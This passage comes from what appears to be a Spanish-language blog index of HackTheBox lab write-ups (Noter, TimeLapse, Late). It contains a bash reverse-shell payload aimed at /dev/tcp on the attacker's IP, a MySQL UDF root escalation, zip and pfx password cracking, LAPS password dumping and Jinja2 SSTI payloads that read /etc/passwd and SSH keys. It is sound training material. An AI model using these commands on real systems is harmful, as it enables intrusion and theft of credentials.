successful. Consider using PASV.150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).226 Transfer complete.26298 bytes received in 0,28 seconds (91,9 kbytes/s)ftp&gt; quit221 Goodbye.¿Hay algo o alguien aquí?Revisando los archivos, nos encontramos con credenciales para la base de datos MySQL:app.config['MYSQL_USER'] = 'root'app.config['MYSQL_PASSWORD'] = 'Nildogg36'Como no tenemos acceso al sistema, debemos pensar en meternos…Dentro de uno de los archivos app.py vemos dos funciones que están usando el ejecutable /bin/bash:def export_note_local(id):\tif check_VIP(session['username']):\t\tcur = mysql.connection.cursor() result = cur.execute(\"SELECT * FROM notes WHERE id = %s and author = %s\", (id,session['username'])) if result &gt; 0:\t note = cur.fetchone() rand_int = random.randint(1,10000) command = f\"node misc/md-to-pdf.js $'{note['body']}' {rand_int}\" subprocess.run(command, shell=True, executable=\"/bin/bash\") return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True) else: return render_template('dashboard.html') else: abort(403) # Export remote@app.route('/export_note_remote', methods=['POST'])@is_logged_indef export_note_remote():\tif check_VIP(session['username']):\t try:\t url = request.form['url'] status, error = parse_url(url) if (status is True) and (error is None): try:\t r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f\"node misc/md-to-pdf.js $'{r.text.strip()}' {rand_int}\" subprocess.run(command, shell=True, executable=\"/bin/bash\") \t if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'): \t\t return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True) else:\t\t return render_template('export_note.html', error=\"Error occured while exporting the !\") \t\t\t\t except Exception as e:\t return render_template('export_note.html', error=\"Error occured!\") else: return render_template('export_note.html', error=f\"Error occured while exporting ! ({error})\") except Exception as e:\t return render_template('export_note.html', error=f\"Error occured while exporting ! ({e})\") \telse:\t abort(403)Además, vemos que md-to-pdf.js se ejecuta con NodeJS. Haciendo una búsqueda por internet nos encontramos una vulnerabilidad que podríamos probar en la sección de la web Export Notes que se otorga solamente para usuarios ‘VIP’:Creamos un archivo malicioso:❯ echo \"--';bash -i &gt;&amp; /dev/tcp/10.10.14.44/4433 0&gt;&amp;1;'--\" &gt; rev.md Levantamos un servidor con python:❯ python3 -m http.serverY en otra ventana debemos ponernos en “escucha” con netcat en el puerto que específicamos dentro del archivo malicioso, 4433:❯ netcat -lnvp 4433Y en el campo URL ponemos lo siguiente http://10.10.14.44:8000/rev.md (que es nuestra IP, el puerto del servidor y el archivo malicioso, respectivamente). Presionamos en exportar y obtenemos una conexión remota:❯ netcat -lnvp 4433Listening on 0.0.0.0 4433Connection received on 10.10.11.160 49170bash: cannot set terminal process group (1261): Inappropriate ioctl for devicebash: no job control in this shellsvc@noter:~/app/web$Escalando privilegiosDespués de hacer una enumeración básica, no encontramos nada de lo que nos podamos aprovechar.Recordemos que tenemos credenciales para conectarnos a la base de datos. Hay una técnica de escalada de privilegios mediante MySQL que podemos probar usando este exploit, subiendo el archivo a la máquina víctima y haciendo lo siguiente:svc@noter:~/tmp$ gcc -g -c raptor_udf2.csvc@noter:~/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcsvc@noter:~/tmp$ mysql -u 'root' -p'Nildogg36'MariaDB [(none)]&gt; use mysql;Database changedMariaDB [mysql]&gt; create table test(line blob);Query OK, 0 rows affectedMariaDB [mysql]&gt; insert into test values(load_file('/home/tmp/raptor_udf2.so'));Query OK, 1 row affectedMariaDB [mysql]&gt; select * from test into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';Query OK, 1 row affectedMariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so';Query OK, 0 rows affectedMariaDB [mysql]&gt; select do_system('chmod u+s /bin/bash');+----------------------------------+| do_system('chmod u+s /bin/bash') |+----------------------------------+| 0 |+----------------------------------+MariaDB [mysql]&gt; exitByeEjecutamos el binario bash con privilegios (-p) y nos convertimos en root:svc@noter:~/tmp$ /bin/bash -pbash-5.0\\# whoamirootbash-5.0#¡Happy Hacking!" }, { "title": "WriteUp TimeLapse HTB", "url": "/posts/WriteUp-TimeLapse-HTB/", "categories": "HackTheBox, WriteUp, Machines, Windows", "tags": "pfx2john, zip2john, john, LAPS, PFX, crackmapexec, evil-winrm, smbclient, OpenSSL", "date": "2022-08-20 00:00:00 -0500", "snippet": "Índice Información básica de la máquina Herramientas y recursos empleados Enumeración SMB Crackeando contraseñas Obteniendo acceso como legacyy Obteniendo credenciales mediante LAPS Obteniendo sesión como AdministratorMáquina TimeLapse IP 10.10.11.152 OS Windows Dificultad Fácil Creador ctrlzero Herramientas y recursos empleados Herramientas Obtención de información: nmap smbclient Comprimir y descomprimir: 7z unzip Crackeadores y generadores de hashes: zip2john pfx2john john crackpkc12 Otros: openssl evil-winrm crackmapexec EnumeraciónIniciemos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:nmap -p- -sCV --open -sS --min-rate 5000 -n -Pn -vvv -oN scope.txt 10.10.11.152Nmap scan report for 10.10.11.152Host is up, received user-set (0.39s latency).Not shown: 65527 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open tcpwrapped syn-ack ttl 127445/tcp open tcpwrapped syn-ack ttl 127593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.03268/tcp open tcpwrapped syn-ack ttl 1273269/tcp open globalcatLDAPssl? syn-ack ttl 12757854/tcp open tcpwrapped syn-ack ttl 127Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 8h00m00s| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-08-19T04:32:07|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 64147/tcp): CLEAN (Timeout)| Check 2 (port 32357/tcp): CLEAN (Timeout)| Check 3 (port 16288/udp): CLEAN (Timeout)| Check 4 (port 22941/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blockedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/SMBVemos el puerto empleado para SMB (Server Message Block) el cual es 445. Podemos intentar conectarnos para ver si hay recursos compartidos que nos pueda servir para comenzar:❯ smbclient --no-pass -L //10.10.11.152 \tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tNETLOGON Disk Logon server share \tShares Disk \tSYSVOL Disk Logon server share Hay un recurso compartido que llama mucho la atención, Shares. Veamos qué nos encontramos ahí y qué nos puede servir:❯ smbclient --no-pass //10.10.11.152/Shares Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Oct 25 15:39:15 2021 .. D 0 Mon Oct 25 15:39:15 2021 Dev D 0 Mon Oct 25 19:40:06 2021 HelpDesk D 0 Mon Oct 25 15:48:42 2021\t\t6367231 blocks of size 4096. 2455284 blocks availablesmb: \\&gt; cd Devsmb: \\Dev\\&gt; ls . D 0 Mon Oct 25 19:40:06 2021 .. D 0 Mon Oct 25 19:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 15:46:42 2021\t\t6367231 blocks of size 4096. 2455284 blocks availablesmb: \\Dev\\&gt; cd ..smb: \\&gt; cd HelpDesksmb: \\HelpDesk\\&gt; ls . D 0 Mon Oct 25 15:48:42 2021 .. D 0 Mon Oct 25 15:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 14:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 14:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 14:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 14:57:44 2021\t\t6367231 blocks of size 4096. 2455284 blocks availablesmb: \\HelpDesk\\&gt; cd ../Devsmb: \\Dev\\&gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (2,0 KiloBytes/sec) (average 2,0 KiloBytes/sec)smb: \\Dev\\&gt; En el directorio Dev tenemos un backup, se ve jugoso de primeras porque puede tener contraseñas o información importante.En el directorio HelpDesk encontramos diversos documentos que de momento no veremos.Al final descargamos el archivo winrm_backup.zip a nuestra máquina con el comando get. Al salir de la sesión de smb, con 7z listamos los archivos que tiene el comprimido:❯ 7z l winrm_backup.zip7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28p7zip Version 17.04 (locale=es_CO.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs x64)Scanning the drive for archives:1 file, 2611 bytes (3 KiB)Listing archive: winrm_backup.zip--Path = winrm_backup.zipType = zipPhysical Size = 2611 Date Time Attr Size Compressed Name------------------- ----- ------------ ------------ ------------------------2021-10-25 14:21:20 ..... 2555 2405 legacyy_dev_auth.pfx------------------- ----- ------------ ------------ ------------------------2021-10-25 14:21:20 2555 2405 1 filesIntentamos descomprimirlo con unzip pero nos pide contraseña:❯ unzip winrm_backup.zip Archive: winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password:Crackeando contraseñasCon zip2john podemos crear un hash equivalente al archivo y guardarlo, para posteriormente crackearlo con JtR (John the Ripper) y obtener la contraseña (en caso de que se encuentre en el diccionario):❯ zip2john winrm_backup.zip &gt; hash_winrm_backupwinrm_backup.zip/legacyy_dev_auth.pfx:$pkzip2$1*2*2*0*965*9fb*12ec5683*0*4e*8*965*12ec*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip2$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zipYa tenemos el hash. Es momento de crackearlo con John the Ripper, para ello empleamos el diccionario rockyou.txt que tiene alrededor de 14 millones de posibles contraseñas:❯ john --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash Using default input encoding: UTF-8Loaded 1 password hash (PKZIP [32/64])Will run 2 OpenMP threadsPress \"q\" or Ctrl-C to abort, almost any other key for statussupremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx)surfrox1391..supervierUse the \"--show\" option to display all of the cracked passwords reliablySession completedObetenemos la contraseña sumpremelegacy; por lo que, ahora podemos descomprimir el archivo winrm_backup.zip:❯ unzip winrm_backup.zipArchive: winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfx Ya que es un archivo con extensión pfx, podemos hacer una búsqueda rápida en internet del para qué sirve. Como dice en el artículo: …incluyen certificados digitales utilizados para procesos de autenticación necesarias para determinar si un usuario o un dispositivo puede acceder a ciertos archivos.Podemos intentar conectarnos a la máquina víctima pero para ello necesitamos primero extraer el certificado y la llave del archivo pfx como se muestra aquí. Al intentar hacerlo, nos pide la contraseña del archivo; por lo que, nuevamente tendremos que obtener una contraseña.Para variar no usaremos John the Ripper, una alternativa sería crackpkcs12:❯ crackpkcs12 -d /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -v -t 10 legacyy_dev_auth.pfx Dictionary attack - Starting 10 threadsPerformance: 3230962 passwords [ 2005 passwords per second]*********************************************************Dictionary attack - Thread 1 - Password found: thuglegacy********************************************************* -d: Directory/Directorio de contraseñas. -v: Verbose mode/Modo verbose. -t: Threads/Hilos. Para obtener el hash equivalente y posteriormente crackearlo con John the Ripper usaríamos pfx2john, de igual forma a como hicimos con zip2john.Obtenemos la contraseña thuglegacy. Ahora sí podemos crear el certificado y la llave (ingresando la contraseña obtenida) que nos permita conectarnos a la máquina víctima:❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate Enter Import Password:❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key Enter Import Password:Enter PEM pass phrase:Verifying - Enter PEM pass phrase: Para el PEM pass phrase y la verificación puse “rabb1t”.Obteniendo acceso como legacyyAhora podemos conectarnos con evil-winrm via SSL.❯ evil-winrm -S -c certificate -k key -i 10.10.11.152Evil-WinRM shell v3.4Warning: SSL enabledInfo: Establishing connection to remote endpointEnter PEM pass phrase:*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoamitimelapse\\legacyyAntes de ejecutar winpeas, podemos hacer una enumeración manual siguiendo los pasos de escalada de privilegios de hacktricks, en el cual uno de los pasos es revisar el historial de powershell. Llegado a este punto, podemos hacer y ver lo siguiente:*Evil-WinRM* PS C:\\\\Users&gt; cd $env:APPDATA\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; ls Directory: C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLineMode LastWriteTime Length Name---- ------------- ------ -----a---- 3/3/2022 11:46 PM 434 ConsoleHost_history.txt*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; type ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties *exitVemos que hay variables declaradas y que está ejecutando código -scriptblock en el puerto 5986 empleando SSL -usessl con las credenciales que están en la variable $c.Podemos recrear este escenario configurando las mismas variables:*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}timelapse\\svc_deploy También podemos conectarnos a través de evil-winrm proporcionando la contraseña vía SSL¡Estamos ejecutando comandos como el usuario svc_deploy! Ahora vamos a enumerar este usuario para ver de qué nos podemos aprovechar:Obteniendo credenciales mediante LAPS*Evil-WinRM* PS C:\\\\Users\\\\legacyy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}User name svc_deployFull Name svc_deployCommentUser\\'s commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 10/25/2021 12:12:37 PMPassword expires NeverPassword changeable 10/26/2021 12:12:37 PMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 4/18/2022 9:12:42 AMLogon hours allowed AllLocal Group Memberships *Remote Management UseGlobal Group memberships *LAPS_Readers *Domain UsersThe command completed successfully. —Es aquí cuando he caído en cuenta que el nombre de la máquina es una pista a LAPS :P—Entre el reconocimiento básico encontramos que el usuario svc_deploy hace parte del grupo LAPS_Readers. Haciendo una búsqueda por nuestro navegador favorito encontramos un artículo sobre diferentes formas de obtener las contraseñas abusando de LAPS.En nuestro caso obtendremos las credenciales usando crackmapexec —puedes usar cualquier otro método empleado en el artículo—.Obteniendo sesión como AdministratorEmpleando crackmapexec podemos usar el módulo laps para obtener las contraseñas;❯ crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R^12p7PLlC%KWaxuaV' --kdcHost 'timelapse.htb' -M lapsSMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)LDAP 10.10.11.152 389 DC01 [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV LAPS 10.10.11.152 389 DC01 [*] Getting LAPS PasswordsLAPS 10.10.11.152 389 DC01 Computer: DC01$ Password: 6jdi\\#U8Ju}8Eq&amp;Gmw,yF\\#}iH Para usar el argumento --kdcHost debimos anteriormente haber agregado el dominio al archivo /etc/host apuntando a la dirección IP de la máquina víctima.Nos conectamos con evil-winrm vía SSL (-S) como administrador.❯ evil-winrm -S -i 10.10.11.152 -p \"6jdi#U8Ju}8Eq&amp;Gmw,yF#}iH\" -u \"administrator\"Evil-WinRM shell v3.4Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\\\Users\\\\Administrator\\\\Documents&gt; whoamitimelapse\\\\Administrator*Evil-WinRM* PS C:\\\\Users\\\\Administrator\\\\Documents&gt;¡Happy Hacking!" }, { "title": "WriteUp Late HTB", "url": "/posts/WriteUp-Late-HTB/", "categories": "HackTheBox, WriteUp, Machines, Linux", "tags": "SSTI, flask, lsattr, chattr, tesseract, jinja2", "date": "2022-07-30 00:00:00 -0500", "snippet": "Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Explotando la vulnerabilidad SSTI Escalando privilegios Transición de archivos Analizando posible vector Máquina Late IP 10.10.11.156 OS Linux Dificultad Fácil Creador kavigihan Herramientas y recursos empleados Herramientas nmap whatweb pspy linpeas Recursos AllTheThings EnumeraciónIniciamos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:Nmap 7.92 scan initiated Sun Jul 24 16:38:43 2022 as: nmap -p- --open -sCV -sS --min-rate 5000 -Pn -vvv -n -oN scope.txt 10.10.11.156Nmap scan report for 10.10.11.156Not shown: 52025 filtered tcp ports (no-response), 13508 closed tcp ports (reset)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN| 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=| 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj80/tcp open http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF| http-methods: |_ Supported Methods: GET HEAD|_http-title: Late - Best online image tools|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHay dos puertos abiertos, el 22 (SSH) y el 80 (HTTP). De momento no contamos con credenciales para iniciar sesión por SSH así que proseguimos a enumerar el sitio web, inicialmente usando la herramienta whatweb:❯ whatweb http://10.10.11.156http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[\\#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]La versión de JQuery es antigua, podríamos intentar el ataque de prototype pollution. De momento, vamos a visualizar la página en el navegador:Home, Contact y MORE INFO, nos llevan a la misma página, no tenemos nada para jugar (campos de entrada); sin embargo, más abajo en la misma página podemos ver un subdominio:late free online photo editor nos lleva a images.late.htb, procedemos a agregar el subdominio al /etc/hosts para que el navegador sepa resolver. Vemos que nos redirige a una página en la cual podemos subir una imagen para leer el texto de la imagen y guardarlo en un archivo. Además, muestra que está empleando flask:Explotando la vulnerabilidad SSTI¿Qué vulnerabilidad podríamos intentar en este caso? Por supuesto, podríamos intentar la vulnerabilidad SSTI. Intentemos subir una imagen de prueba con {{7*7}} (Hay otros test que se pueden usar para comprobar si es vulnerable):Al subir la imagen y escanearla, nos descarga un archivo llamado results.txt en el que aparece el texto de la imagen, pero en este caso ha sido interpretado el código. Abrimos el archivo y aparece &lt;p&gt;49&lt;/p&gt;, de esta forma queda testeado que es vulnerable.Probemos un payload de AllTheThings. En mi caso usaré el siguiente para ver los usuarios del sistema:{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}(Recordemos tomarle una captura de pantalla para subirlo. Además, puede que no salga a la primera porque podría no leer bien las letras, en ese caso es bueno probar ampliando el rango en que se toma la foto).La respuesta del servidor es nuevamente el archivo results.txt. En este caso vemos el archivo /etc/passwd y hay dos usuarios que tienen shell: el usuario svc_acc y root. Sabiendo lo anterior, ahora podemos leer la id_rsa del usuario svc_acc para intentar conectarnos por SSH; por lo que, nuevamente usaré el payload anterior, cambiando la ruta y hacer un pantallazo de:{{ get_flashed_messages.__globals__.__builtins__.open(\"/home/scv_acc/.ssh/id_rsa\").read() }}…para subirlo y obtener la clave privada. Ahora movemos el archivo con la clave privada a nuestro directorio de trabajo y le quitamos las etiquetas &lt;p&gt;&lt;/p&gt; , además le damos permisos 600:❯ mv ~/Downloads/results.txt id_rsa; ❯ sed -i 's/&lt;p&gt;//' id_rsa❯ sed -i 's/&lt;\\/p&gt;//' id_rsa❯ chmod 600 id_rsa❯ cat id_rsa-----BEGIN RSA PRIVATE 